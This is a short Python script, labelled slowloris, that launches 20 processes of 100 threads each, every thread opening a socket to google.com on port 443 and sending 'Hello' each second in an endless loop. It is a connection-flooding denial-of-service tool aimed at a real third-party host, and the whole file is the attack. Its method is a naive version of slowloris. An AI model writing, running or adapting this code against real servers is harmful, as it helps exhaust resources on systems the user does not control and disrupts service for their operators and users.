import socket
from threading import Thread
from multiprocessing import Process
import time
HOST = "google.com"
PORT = 443

def connect_to_ha():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, PORT))
	print("connected to server")
	while True:
		s.send("Hello".encode())
		time.sleep(1)
	
	
def slowloris():
	for i in range(100):
		Thread(target=connect_to_ha).start()
		
def main():
	for i in range(20):
		Process(target = slowloris).start()
		
		
if __name__ == "__main__":
	main()